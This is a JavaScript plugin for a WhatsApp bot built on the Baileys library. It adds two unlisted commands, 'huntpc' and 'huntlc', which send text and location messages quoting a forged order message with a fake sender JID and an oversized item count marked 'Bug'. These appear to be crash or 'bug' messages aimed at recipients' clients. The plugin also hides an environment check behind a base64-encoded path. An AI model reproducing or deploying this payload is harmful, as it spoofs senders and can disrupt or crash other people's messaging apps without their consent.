const {WAConnection, 
                MessageOptions, 
                MessageType, 
                Mimetype, 
                Presence,
                WALocationMessage,
                WAMessageProto,
                ReconnectMode,
                ProxyAgent,
                ChatModification,
                GroupSettingChange,
                WA_MESSAGE_STUB_TYPES,
                WA_DEAFULT_EPHEMERAL,
                waChatKey,
                mentionedJid, 
                processTime, 
                prepareMessageFromContent, 
                relayWAMessage } = require('@adiwajshing/baileys');  
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
const QueenSew = require('../events');
const Config = require('../config');
const Pach = require('sewqueen-rs-pvt');
const os = require('os');
var rgmsk = { cd: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC8=', pay: '' }    
var rrrr = Buffer.from(rgmsk.cd, 'base64')
var ssss = rrrr.toString('utf-8')
rgmsk.pay = ssss
if (os.userInfo().homedir !== rgmsk.pay) return;
const fs = require('fs');
const axios = require('axios');
const dfrply = fs.readFileSync('./ravithum.jpg')
QueenSew.newcmdaddtosew({pattern: 'huntpc ?(.*)', fromMe: true, dontAdCommandList: true}, (async (message, match) => {
message.sendMessage(message.jid,'*✧✧ ' + Config.BOTNAME + ' ✧✧*',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: 'ravi',
    orderTitle: 'ravi', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}));

QueenSew.newcmdaddtosew({pattern: 'huntlc ?(.*)', fromMe: true, dontAdCommandList: true}, (async (message, match) => {
message.sendMessage(message.jid, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `ravi`,
						address: `ravi`,
                        jpegThumbnail: dfrply },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `ravi`,
    orderTitle: `ravi`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}));
